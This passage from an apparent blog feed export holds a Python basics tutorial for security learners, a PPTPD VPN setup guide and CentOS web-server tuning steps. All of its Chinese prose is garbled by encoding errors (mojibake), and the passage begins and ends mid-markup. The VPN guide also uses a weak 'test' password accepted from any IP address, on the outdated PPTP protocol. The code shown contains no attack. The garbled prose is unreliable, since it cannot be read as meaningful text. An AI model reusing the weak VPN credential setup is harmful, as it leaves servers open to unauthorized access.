class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>dir(ip)</div><div class="line">[<span class="string">'__add__'</span>, <span class="string">'__class__'</span>, <span class="string">'__contains__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__eq__'</span>, <span class="string">'__format__'</span>, <span class="string">'__ge__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__getitem__'</span>, <span class="string">'__getnewargs__'</span>, <span class="string">'__getslice__'</span>, <span class="string">'__gt__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__init__'</span>, <span class="string">'__le__'</span>, <span class="string">'__len__'</span>, <span class="string">'__lt__'</span>, <span class="string">'__mod__'</span>, <span class="string">'__mul__'</span>, <span class="string">'__ne__'</span>, <span class="string">'__new__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__rmod__'</span>, <span class="string">'__rmul__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>, <span class="string">'_formatter_field_name_split'</span>, <span class="string">'_formatter_parser'</span>, <span class="string">'capitalize'</span>, <span class="string">'center'</span>, <span class="string">'count'</span>, <span class="string">'decode'</span>, <span class="string">'encode'</span>, <span class="string">'endswith'</span>, <span class="string">'expandtabs'</span>, <span class="string">'find'</span>, <span class="string">'format'</span>, <span class="string">'index'</span>, <span class="string">'isalnum'</span>, <span class="string">'isalpha'</span>, <span class="string">'isdigit'</span>, <span class="string">'islower'</span>, <span class="string">'isspace'</span>, <span class="string">'istitle'</span>, <span class="string">'isupper'</span>, <span class="string">'join'</span>, <span class="string">'ljust'</span>, <span class="string">'lower'</span>, <span class="string">'lstrip'</span>, <span class="string">'partition'</span>, <span class="string">'replace'</span>, <span class="string">'rfind'</span>, <span class="string">'rindex'</span>, <span class="string">'rjust'</span>, <span class="string">'rpartition'</span>, <span class="string">'rsplit'</span>, <span class="string">'rstrip'</span>, <span class="string">'split'</span>, <span class="string">'splitlines'</span>, <span class="string">'startswith'</span>, <span class="string">'strip'</span>, <span class="string">'swapcase'</span>, <span class="string">'title'</span>, <span class="string">'translate'</span>, <span class="string">'upper'</span>, <span class="string">'zfill'</span>]</div></pre></div></div></figure><p>ç°åœ¨ä½ å¯ä»¥ä½¿ç”¨ä¸Šé¢åˆ—ä¸¾å‡ºæ¥çš„å†…å»ºå­—ç¬¦ä¸²å‡½æ•°ï¼Œå¦‚æœæƒ³çŸ¥é“è¿™ä¸ªå‡½æ•°çš„æ›´å¤šæè¿°å¯ä»¥å‚è€ƒå‰é¢æåˆ°çš„help()å‡½æ•°:</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></div><div class="code"><pre><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>help(ip.split)</div><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>string = ip+<span class="string">':'</span>+str(port)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>string</div><div class="line"><span class="string">'8.8.8.8:53'</span></div><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>string.split(<span class="string">':'</span>)</div><div class="line">[<span class="string">'8.8.8.8'</span>, <span class="string">'53'</span>]</div></pre></div></div></figure><p>è¿™splitå‡½æ•°æŠŠä¸€ä¸ªå­—ç¬¦ä¸²é€šè¿‡â€:â€åˆ‡å‰²ç”Ÿæˆä¸€ä¸ªæ–°çš„åˆ—è¡¨ã€‚è¿™æ˜¯ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„å­—ç¬¦ä¸²å‡½æ•°å› ä¸ºä½ èƒ½å¤ŸæŠŠè¿™ä¸ªå­—ç¬¦ä¸²é‡Œé¢çš„æœ‰ç”¨ä¿¡æ¯æå‡ºå‡ºæ¥ã€‚ä¾‹å¦‚ï¼Œä½ è·å–åˆ°äº†ä¸€ä¸ªipåˆ—è¡¨ï¼Œä½ æƒ³åœ¨è¿™ä¸ªåˆ—è¡¨é‡Œé¢æ·»åŠ ä¸€ä¸ªç´¢å¼•å€¼ã€‚ä½ ä¹Ÿå¯ä»¥åˆ é™¤å’Œæ·»åŠ æ–°çš„å€¼åˆ°è¿™ä¸ªåˆ—è¡¨é‡Œé¢é€šè¿‡.append()å’Œ.remove()å‡½æ•°</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></div><div class="code"><pre><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>list = string.split(<span class="string">':'</span>)</div><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>list</div><div class="line">[<span class="string">'8.8.8.8'</span>, <span class="string">'53'</span>]</div><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>list[<span class="number">0</span>]</div><div class="line"><span class="string">'8.8.8.8'</span></div><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>list.append(<span class="string">'google'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>list</div><div class="line">[<span class="string">'8.8.8.8'</span>, <span class="string">'53'</span>, <span class="string">'google'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>list.remove(<span class="string">'google'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>list</div><div class="line">[<span class="string">'8.8.8.8'</span>, <span class="string">'53'</span>]</div><div class="line">&gt;&gt;&gt;</div></pre></div></div></figure><h3 id="Pythonæ¨¡å—"><a href="#Pythonæ¨¡å—" class="headerlink" title="Pythonæ¨¡å—"></a>Pythonæ¨¡å—</h3><p>åœ¨ä¸Šé¢æåˆ°è¿‡ï¼ŒPythonæ¨¡å—èƒ½å¤Ÿè®©ä½ ç”¨å°‘é‡çš„ä»£ç å°±èƒ½å¤Ÿå®Œæˆä½ çš„ä»»åŠ¡,Pythonæœ‰è®¸å¤šæœ‰ç”¨çš„å†…å»ºæ¨¡å—(os,subprocess,socket,urllib,httplib,re,sysç­‰ç­‰)å’Œç¬¬ä¸‰æ–¹æ¨¡å—(cymruwhois,scapy,dpkt,spiderç­‰ç­‰).ä½¿ç”¨Pythonæ¨¡å—å¾ˆç®€å•â€import <modulenmae>â€œ. OSæ¨¡å—æ˜¯éå¸¸é‡è¦çš„å› ä¸ºä½ éœ€è¦åœ¨ä½ çš„Pythonä»£ç é‡Œé¢è°ƒç”¨ç³»ç»Ÿå‘½ä»¤:</modulenmae></p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></div><div class="code"><pre><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</div><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>dir(os)</div><div class="line">[<span class="string">'EX_CANTCREAT'</span>, <span class="string">'EX_CONFIG'</span>, <span class="string">'EX_DATAERR'</span>, <span class="string">'EX_IOERR'</span>, <span class="string">'EX_NOHOST'</span>, <span class="string">'EX_NOINPUT'</span>, <span class="string">'EX_NOPERM'</span>, <span class="string">'EX_NOUSER'</span>, <span class="string">'EX_OK'</span>, <span class="string">'EX_OSERR'</span>, <span class="string">'EX_OSFILE'</span>, <span class="string">'EX_PROTOCOL'</span>, <span class="string">'EX_SOFTWARE'</span>, <span class="string">'EX_TEMPFAIL'</span>, <span class="string">'EX_UNAVAILABLE'</span>, <span class="string">'EX_USAGE'</span>, <span class="string">'F_OK'</span>, <span class="string">'NGROUPS_MAX'</span>, <span class="string">'O_APPEND'</span>, <span class="string">'O_ASYNC'</span>, <span class="string">'O_CREAT'</span>, <span class="string">'O_DIRECT'</span>, <span class="string">'O_DIRECTORY'</span>, <span class="string">'O_DSYNC'</span>, <span class="string">'O_EXCL'</span>, <span class="string">'O_LARGEFILE'</span>, <span class="string">'O_NDELAY'</span>, <span class="string">'O_NOATIME'</span>, <span class="string">'O_NOCTTY'</span>, <span class="string">'O_NOFOLLOW'</span>, <span class="string">'O_NONBLOCK'</span>, <span class="string">'O_RDONLY'</span>, <span class="string">'O_RDWR'</span>, <span class="string">'O_RSYNC'</span>, <span class="string">'O_SYNC'</span>, <span class="string">'O_TRUNC'</span>, <span class="string">'O_WRONLY'</span>, <span class="string">'P_NOWAIT'</span>, <span class="string">'P_NOWAITO'</span>, <span class="string">'P_WAIT'</span>, <span class="string">'R_OK'</span>, <span class="string">'SEEK_CUR'</span>, <span class="string">'SEEK_END'</span>, <span class="string">'SEEK_SET'</span>, <span class="string">'ST_APPEND'</span>, <span class="string">'ST_MANDLOCK'</span>, <span class="string">'ST_NOATIME'</span>, <span class="string">'ST_NODEV'</span>, <span class="string">'ST_NODIRATIME'</span>, <span class="string">'ST_NOEXEC'</span>, <span class="string">'ST_NOSUID'</span>, <span class="string">'ST_RDONLY'</span>, <span class="string">'ST_RELATIME'</span>, <span class="string">'ST_SYNCHRONOUS'</span>, <span class="string">'ST_WRITE'</span>, <span class="string">'TMP_MAX'</span>, <span class="string">'UserDict'</span>, <span class="string">'WCONTINUED'</span>, <span class="string">'WCOREDUMP'</span>, <span class="string">'WEXITSTATUS'</span>, <span class="string">'WIFCONTINUED'</span>, <span class="string">'WIFEXITED'</span>, <span class="string">'WIFSIGNALED'</span>, <span class="string">'WIFSTOPPED'</span>, <span class="string">'WNOHANG'</span>, <span class="string">'WSTOPSIG'</span>, <span class="string">'WTERMSIG'</span>, <span class="string">'WUNTRACED'</span>, <span class="string">'W_OK'</span>, <span class="string">'X_OK'</span>, <span class="string">'_Environ'</span>, <span class="string">'__all__'</span>, <span class="string">'__builtins__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__file__'</span>, <span class="string">'__name__'</span>, <span class="string">'__package__'</span>, <span class="string">'_copy_reg'</span>, <span class="string">'_execvpe'</span>, <span class="string">'_exists'</span>, <span class="string">'_exit'</span>, <span class="string">'_get_exports_list'</span>, <span class="string">'_make_stat_result'</span>, <span class="string">'_make_statvfs_result'</span>, <span class="string">'_pickle_stat_result'</span>, <span class="string">'_pickle_statvfs_result'</span>, <span class="string">'_spawnvef'</span>, <span class="string">'abort'</span>, <span class="string">'access'</span>, <span class="string">'altsep'</span>, <span class="string">'chdir'</span>, <span class="string">'chmod'</span>, <span class="string">'chown'</span>, <span class="string">'chroot'</span>, <span class="string">'close'</span>, <span class="string">'closerange'</span>, <span class="string">'confstr'</span>, <span class="string">'confstr_names'</span>, <span class="string">'ctermid'</span>, <span class="string">'curdir'</span>, <span class="string">'defpath'</span>, <span class="string">'devnull'</span>, <span class="string">'dup'</span>, <span class="string">'dup2'</span>, <span class="string">'environ'</span>, <span class="string">'errno'</span>, <span class="string">'error'</span>, <span class="string">'execl'</span>, <span class="string">'execle'</span>, <span class="string">'execlp'</span>, <span class="string">'execlpe'</span>, <span class="string">'execv'</span>, <span class="string">'execve'</span>, <span class="string">'execvp'</span>, <span class="string">'execvpe'</span>, <span class="string">'extsep'</span>, <span class="string">'fchdir'</span>, <span class="string">'fchmod'</span>, <span class="string">'fchown'</span>, <span class="string">'fdatasync'</span>, <span class="string">'fdopen'</span>, <span class="string">'fork'</span>, <span class="string">'forkpty'</span>, <span class="string">'fpathconf'</span>, <span class="string">'fstat'</span>, <span class="string">'fstatvfs'</span>, <span class="string">'fsync'</span>, <span class="string">'ftruncate'</span>, <span class="string">'getcwd'</span>, <span class="string">'getcwdu'</span>, <span class="string">'getegid'</span>, <span class="string">'getenv'</span>, <span class="string">'geteuid'</span>, <span class="string">'getgid'</span>, <span class="string">'getgroups'</span>, <span class="string">'getloadavg'</span>, <span class="string">'getlogin'</span>, <span class="string">'getpgid'</span>, <span class="string">'getpgrp'</span>, <span class="string">'getpid'</span>, <span class="string">'getppid'</span>, <span class="string">'getresgid'</span>, <span class="string">'getresuid'</span>, <span class="string">'getsid'</span>, <span class="string">'getuid'</span>, <span class="string">'initgroups'</span>, <span class="string">'isatty'</span>, <span class="string">'kill'</span>, <span class="string">'killpg'</span>, <span class="string">'lchown'</span>, <span class="string">'linesep'</span>, <span class="string">'link'</span>, <span class="string">'listdir'</span>, <span class="string">'lseek'</span>, <span class="string">'lstat'</span>, <span class="string">'major'</span>, <span class="string">'makedev'</span>, <span class="string">'makedirs'</span>, <span class="string">'minor'</span>, <span class="string">'mkdir'</span>, <span class="string">'mkfifo'</span>, <span class="string">'mknod'</span>, <span class="string">'name'</span>, <span class="string">'nice'</span>, <span class="string">'open'</span>, <span class="string">'openpty'</span>, <span class="string">'pardir'</span>, <span class="string">'path'</span>, <span class="string">'pathconf'</span>, <span class="string">'pathconf_names'</span>, <span class="string">'pathsep'</span>, <span class="string">'pipe'</span>, <span class="string">'popen'</span>, <span class="string">'popen2'</span>, <span class="string">'popen3'</span>, <span class="string">'popen4'</span>, <span class="string">'putenv'</span>, <span class="string">'read'</span>, <span class="string">'readlink'</span>, <span class="string">'remove'</span>, <span class="string">'removedirs'</span>, <span class="string">'rename'</span>, <span class="string">'renames'</span>, <span class="string">'rmdir'</span>, <span class="string">'sep'</span>, <span class="string">'setegid'</span>, <span class="string">'seteuid'</span>, <span class="string">'setgid'</span>, <span class="string">'setgroups'</span>, <span class="string">'setpgid'</span>, <span class="string">'setpgrp'</span>, <span class="string">'setregid'</span>, <span class="string">'setresgid'</span>, <span class="string">'setresuid'</span>, <span class="string">'setreuid'</span>, <span class="string">'setsid'</span>, <span class="string">'setuid'</span>, <span class="string">'spawnl'</span>, <span class="string">'spawnle'</span>, <span class="string">'spawnlp'</span>, <span class="string">'spawnlpe'</span>, <span class="string">'spawnv'</span>, <span class="string">'spawnve'</span>, <span class="string">'spawnvp'</span>, <span class="string">'spawnvpe'</span>, <span class="string">'stat'</span>, <span class="string">'stat_float_times'</span>, <span class="string">'stat_result'</span>, <span class="string">'statvfs'</span>, <span class="string">'statvfs_result'</span>, <span class="string">'strerror'</span>, <span class="string">'symlink'</span>, <span class="string">'sys'</span>, <span class="string">'sysconf'</span>, <span class="string">'sysconf_names'</span>, <span class="string">'system'</span>, <span class="string">'tcgetpgrp'</span>, <span class="string">'tcsetpgrp'</span>, <span class="string">'tempnam'</span>, <span class="string">'times'</span>, <span class="string">'tmpfile'</span>, <span class="string">'tmpnam'</span>, <span class="string">'ttyname'</span>, <span class="string">'umask'</span>, <span class="string">'uname'</span>, <span class="string">'unlink'</span>, <span class="string">'unsetenv'</span>, <span class="string">'urandom'</span>, <span class="string">'utime'</span>, <span class="string">'wait'</span>, <span class="string">'wait3'</span>, <span class="string">'wait4'</span>, <span class="string">'waitpid'</span>, <span class="string">'walk'</span>, <span class="string">'write'</span>]</div><div class="line">&gt;&gt;&gt;</div></pre></div></div></figure><p>ä½ å¯ä»¥çœ‹åˆ°ä¸Šé¢osæ¨¡å—ç»™ä½ æä¾›äº†å¾ˆå¤šå¯ä»¥ä½¿ç”¨çš„åŠŸèƒ½å‡½æ•°ï¼Œå…¶ä¸­æˆ‘å‘ç°æˆ‘ç»å¸¸ä½¿ç”¨â€os.systemâ€ï¼Œæˆ‘å¯ç»™å®ƒä¼ é€’ä¸€ä¸ªå‘½ä»¤ï¼Œç„¶åé€šè¿‡å®ƒå»åœ¨ç³»ç»Ÿåº•å±‚æ‰§è¡Œæˆ‘ä»¬ä¼ é€’çš„å‘½ä»¤.ä¸‹é¢æˆ‘ä»¬å°†ä¼šæ‰§è¡Œä¸€ä¸ªå‘½ä»¤â€echo â€˜UHJpbWFsIFNlY3VyaXR5Cg==â€™ | base64 -dâ€:</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></div><div class="code"><pre><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>os.system(<span class="string">"echo 'UHJpbWFsIFNlY3VyaXR5Cg==' | base64 -d"</span>)</div><div class="line">Primal Security</div><div class="line">&gt;&gt;&gt;</div></pre></div></div></figure><h3 id="åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¯¹è±¡"><a href="#åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¯¹è±¡" class="headerlink" title="åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¯¹è±¡"></a>åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¯¹è±¡</h3><p>ç°åœ¨æˆ‘ä»¬å°†æ¼”ç¤ºä¸€äº›ä¾‹å­,å¦‚ä½•åœ¨Pythoné‡Œé¢ä»ä¸€ä¸ªæ–‡ä»¶é‡Œé¢è¯»å–æ•°æ®å’Œåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ã€‚ä¸‹é¢çš„è¿™ä¸ªä¾‹å­æ¼”ç¤ºäº†å¦‚ä½•åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¯¹è±¡ï¼Œå¹¶ä¸”è¯»å–/å†™å…¥æ•°æ®åˆ°è¿™ä¸ªå¯¹è±¡é‡Œé¢ï¼Œé€šå¸¸ä½ è‡ªå·±è¯»å–ä¸€ä¸ªæ–‡ä»¶çš„æ•°æ®ï¼Œå¹¶ä¸”åšä¸€äº›é€»è¾‘å¤„ç†ç„¶åæŠŠè¾“å‡ºçš„å†™åˆ°æ–‡ä»¶é‡Œé¢:</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></div><div class="code"><pre><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>file = open(<span class="string">'test.txt'</span>, <span class="string">'w'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>file.write(<span class="string">'Hello World'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>file.close()    </div><div class="line"><span class="meta">&gt;&gt;&gt; </span>file = open(<span class="string">'test.txt'</span>, <span class="string">'r'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>file.readlines()</div><div class="line">[<span class="string">'Hello World'</span>]</div><div class="line">&gt;&gt;&gt;</div></pre></div></div></figure><blockquote><p>åœ¨Pythonè§£é‡Šå™¨é‡Œé¢ç»ƒä¹ ä¸Šé¢çš„å†…å®¹å¹¶ä¸”å¤šåŠ å·©å›ºï¼Œå› ä¸ºè¿™äº›å†…å®¹åœ¨åé¢çš„ç« èŠ‚é‡Œé¢ä¼šç»å¸¸ä½¿ç”¨ï¼Œå½“æˆ‘å†™ä»£ç çš„æ—¶å€™ï¼Œæˆ‘å–œæ¬¢æ‰“å¼€ä¸¤ä¸ªç»ˆç«¯ï¼Œä¸€ä¸ªç”¨äºæ‰§è¡Œpythonè§£é‡Šå™¨ï¼Œè¿˜æœ‰ä¸€ä¸ªç”¨æ¥æŠŠé€»è¾‘å†™å…¥åˆ°è„šæœ¬é‡Œé¢ã€‚ä¸‹ä¸€ç« å°†ä¼šå†™ä¸€ä¸ªçœŸå®çš„Pythonè„šæœ¬ï¼Œ å£°æ˜å®šä¹‰ï¼Œç±»å’Œsysæ¨¡å—ã€‚</p></blockquote>]]></content>
      
      <categories>
          
          <category> Python </category>
          
          <category> Hacker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Linuxæ­å»ºvpnæœåŠ¡å™¨</title>
      <link href="/2015/07/02/linux-vpn/"/>
      <url>/2015/07/02/linux-vpn/</url>
      <content type="html"><![CDATA[<blockquote><p>æ¼”ç¤ºä¸­ä½¿ç”¨çš„æ˜¯Debainç³»ç»Ÿ,ä½†æ€è·¯ç›¸åŒ,å¥½çš„æˆ‘ä»¬å¼€å§‹å§</p></blockquote><h2 id="1ã€å®‰è£…PPTPD"><a href="#1ã€å®‰è£…PPTPD" class="headerlink" title="1ã€å®‰è£…PPTPD"></a>1ã€å®‰è£…PPTPD</h2><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">apt-get install pptpd</div></pre></div></div></figure><a id="more"></a><h2 id="2ã€ç¼–è¾‘pptpd-conf"><a href="#2ã€ç¼–è¾‘pptpd-conf" class="headerlink" title="2ã€ç¼–è¾‘pptpd.conf"></a>2ã€ç¼–è¾‘pptpd.conf</h2><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">vim /etc/pptpd.conf</div></pre></div></div></figure><p><code>ä½¿éæ³¨é‡Šçš„å†…å®¹å¦‚ä¸‹</code></p><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">option /etc/ppp/pptpd-options</div><div class="line">localip 192.168.0.1</div><div class="line">remoteip 192.168.0.234-238,192.168.0.245</div></pre></div></div></figure><blockquote><p>è¿™ä¸¤å¥è®¾ç½®äº†å½“å¤–éƒ¨è®¡ç®—æœºé€šè¿‡pptpè”æ¥åˆ°vpnåæ‰€èƒ½æ‹¿åˆ°çš„ipåœ°å€èŒƒå›´å’ŒæœåŠ¡å™¨çš„ipåœ°å€è®¾ç½®</p></blockquote><h2 id="3ã€æ·»åŠ ç™»å½•ç”¨æˆ·"><a href="#3ã€æ·»åŠ ç™»å½•ç”¨æˆ·" class="headerlink" title="3ã€æ·»åŠ ç™»å½•ç”¨æˆ·"></a>3ã€æ·»åŠ ç™»å½•ç”¨æˆ·</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">vim  /etc/ppp/chap-secrets</div></pre></div></div></figure><p><code>æ·»åŠ ä¸€è¡Œï¼Œå†…å®¹å¦‚ä¸‹</code></p><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#clientserversecretIP addresses</span></div><div class="line"><span class="comment">#ç”¨æˆ·åpptpdå¯†ç å…è®¸è¿æ¥IP</span></div><div class="line"><span class="built_in">test</span>pptpd<span class="string">"test"</span>*</div></pre></div></div></figure><blockquote><p>å¯†ç ç”¨å¼•å·æ‹¬èµ·æ¥ï¼Œæœ€åé‚£ä¸ªæ˜Ÿå·æ˜¯è¯´å…è®¸ä»ä»»ä½•IPåœ°å€è¿æ¥ï¼Œå¦‚æœä½ æƒ³å•ç‹¬è®¾å®šIPåœ°å€ä¹Ÿå¯ä»¥</p></blockquote><p>ç†è®ºä¸Šåˆ°è¿™é‡Œä¸€ä¸ªvpnå°±å·²ç»æ­å»ºå®Œæ¯•äº†ã€‚<br>ä¸è¿‡ä½ å¹¶ä¸èƒ½é€šè¿‡è¿™ä¸ªæ¥ä¸ŠInternetï¼Œå› ä¸ºæ‰€æœ‰çš„æ•°æ®éƒ½ä½œç”¨äºé‚£å°<code>pptpd</code>çš„æœåŠ¡å™¨ä¸Šï¼Œ è€Œä¸ä¼šä¼ å…¥æ‹¨å…¥çš„è®¡ç®—æœºè®¾å¤‡ä¸Šã€‚è¦ä¸ŠInternetè¿˜éœ€è¦é…ç½®<code>iptables</code>ï¼š </p><h2 id="4ã€-è®¾ç½®DNSè§£æï¼Œç¼–è¾‘pptpd-options"><a href="#4ã€-è®¾ç½®DNSè§£æï¼Œç¼–è¾‘pptpd-options" class="headerlink" title="4ã€ è®¾ç½®DNSè§£æï¼Œç¼–è¾‘pptpd-options"></a>4ã€ è®¾ç½®DNSè§£æï¼Œç¼–è¾‘pptpd-options</h2><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">vim /etc/ppp/pptpd-options</div></pre></div></div></figure><blockquote><p>åç§°å¯èƒ½ä¼šä¸åŒï¼Œå…·ä½“ä½ç½®åœ¨<code>/etc/pptpd.conf</code>18è¡Œå·¦å³</p></blockquote><p>æ‰¾åˆ°<code>ms-dns</code>ï¼Œå–æ¶ˆæ‰æ³¨é‡Šï¼Œå¹¶ä¿®æ”¹DNSåœ°å€<br>æˆ‘ç”¨çš„æ˜¯google dnsï¼Œå¦‚ä¸‹  :</p><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">ms-dns 8.8.8.8</div><div class="line">ms-dns 8.8.4.4</div></pre></div></div></figure><h2 id="5ã€-å¼€å¯è½¬å‘"><a href="#5ã€-å¼€å¯è½¬å‘" class="headerlink" title="5ã€ å¼€å¯è½¬å‘"></a>5ã€ å¼€å¯è½¬å‘</h2><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">vim /etc/sysctl.conf</div></pre></div></div></figure><p><code>å–æ¶ˆå¦‚ä¸‹å†…å®¹è¡Œçš„æ³¨é‡Š</code></p><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">net.ipv4.ip_forward=1</div></pre></div></div></figure><h2 id="6ã€æ‰“å¼€IPè½¬å‘åŠŸèƒ½"><a href="#6ã€æ‰“å¼€IPè½¬å‘åŠŸèƒ½" class="headerlink" title="6ã€æ‰“å¼€IPè½¬å‘åŠŸèƒ½"></a>6ã€æ‰“å¼€IPè½¬å‘åŠŸèƒ½</h2><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</div></pre></div></div></figure><h2 id="7ã€è®¾ç½®iptables"><a href="#7ã€è®¾ç½®iptables" class="headerlink" title="7ã€è®¾ç½®iptables"></a>7ã€è®¾ç½®iptables</h2><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">iptables -t nat -I POSTROUTING -j MASQUERADE</div></pre></div></div></figure><h2 id="8ã€-å¯åŠ¨æœåŠ¡"><a href="#8ã€-å¯åŠ¨æœåŠ¡" class="headerlink" title="8ã€ å¯åŠ¨æœåŠ¡"></a>8ã€ å¯åŠ¨æœåŠ¡</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">/etc/init.d/pptpd restart</div></pre></div></div></figure><blockquote><p>VPNæ­å»ºå®Œæ¯•ï¼Œå¯ä»¥å°è¯•ç”¨å®¢æˆ·ç«¯ç™»å½•äº†ã€‚pptpdç›‘å¬ç«¯å£å·ä¸º<code>1723</code></p></blockquote>]]></content>
      
      <categories>
          
          <category> VPN </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Centos7ä½œä¸ºwebæœåŠ¡å™¨ä¼˜åŒ–</title>
      <link href="/2015/04/04/linux-web/"/>
      <url>/2015/04/04/linux-web/</url>
      <content type="html"><![CDATA[<p>Centos7ä½œä¸ºwebæœåŠ¡å™¨çš„ä¸€äº›ç®€å•é…ç½®</p><a id="more"></a><h2 id="1-å…³é—­firewalldå¹¶æ›¿æ¢iptables"><a href="#1-å…³é—­firewalldå¹¶æ›¿æ¢iptables" class="headerlink" title="1. å…³é—­firewalldå¹¶æ›¿æ¢iptables"></a><code>1</code>. å…³é—­firewalldå¹¶æ›¿æ¢iptables</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></div><div class="code"><pre><div class="line">systemctl stop firewalld.service<span class="comment">#åœæ­¢firewall</span></div><div class="line">systemctl <span class="built_in">disable</span> firewalld.service<span class="comment">#ç¦æ­¢firewallå¼€æœºå¯åŠ¨</span></div><div class="line">yum install iptables-services <span class="comment">#å®‰è£…</span></div><div class="line">iptables -nvL   <span class="comment">#æŸ¥çœ‹è§„åˆ™</span></div></pre></div></div></figure><h2 id="2-åŠ å¤§æ‰“å¼€æ–‡ä»¶æ•°é™åˆ¶"><a href="#2-åŠ å¤§æ‰“å¼€æ–‡ä»¶æ•°é™åˆ¶" class="headerlink" title="2. åŠ å¤§æ‰“å¼€æ–‡ä»¶æ•°é™åˆ¶"></a><code>2</code>. åŠ å¤§æ‰“å¼€æ–‡ä»¶æ•°é™åˆ¶</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></div><div class="code"><pre><div class="line">vim /etc/security/limits.conf</div><div class="line"><span class="comment">#æ·»åŠ å¦‚ä¸‹å†…å®¹:</span></div><div class="line">*soft  nofile 1024000</div><div class="line"></div><div class="line">*hard  nofile 1024000</div><div class="line"></div><div class="line">hive   -  nofile 1024000</div><div class="line"></div><div class="line">hive   -  nproc  1024000</div></pre></div></div></figure><blockquote><p>ulimit -n<br>ulimit -a</p><blockquote><p><code>æŸ¥è¯¢å½“å‰é…ç½®</code></p></blockquote></blockquote><h2 